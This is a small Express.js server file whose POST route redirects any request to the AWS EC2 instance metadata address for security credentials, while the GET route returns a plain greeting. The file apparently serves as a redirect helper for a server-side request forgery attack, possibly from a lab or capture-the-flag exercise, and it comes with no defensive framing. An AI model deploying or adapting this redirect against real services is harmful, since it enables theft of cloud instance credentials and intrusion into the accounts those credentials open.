const express = require("express");
const app = express();

app.post("/", (req, res) => {
  res.redirect(
    "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
  );
});

app.get("/", (req, res) => {
  res.send("Hello World!");
});

app.listen(10000, () => {
  console.log("Server running on port 10000");
});
